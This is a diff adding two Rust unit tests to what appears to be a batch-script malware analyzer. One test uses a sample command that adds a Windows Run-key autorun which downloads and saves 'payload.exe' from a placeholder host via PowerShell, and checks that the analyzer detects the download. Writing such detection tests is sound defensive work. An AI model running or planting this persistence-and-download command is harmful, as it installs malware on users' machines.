@@ -1379,6 +1379,20 @@ mod echo_tests {
     }
 
     #[test]
+    fn reg_add_run_key_recursively_analyzes_persisted_command() {
+        let script = br#"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d "cmd /c powershell -c iwr http://example.test/payload.exe -OutFile drop.exe" /f"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::Download { src, .. } if src == "http://example.test/payload.exe")),
+            "persisted downloader was not recursively analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn schtasks_create_emits_persistence_trait() {
         // `schtasks /create /tn X /tr Y` registers a scheduled-task
         // autorun. Same Persistence trait as reg-add Run, with
@@ -2113,6 +2127,17 @@ mod for_f_misc_tests {
         let report = analyze(script, &Config::default());
         assert!(
             report.deobfuscated.contains("echo got=first|second third"),
+            "got:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn for_f_tokens_star_without_indexes_preserves_entire_line() {
+        let script = br#"for /f "tokens=*" %%a in ("alpha,beta,gamma") do echo got=%%a"#;
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo got=alpha,beta,gamma"),
             "got:\n{}",
             report.deobfuscated
         );
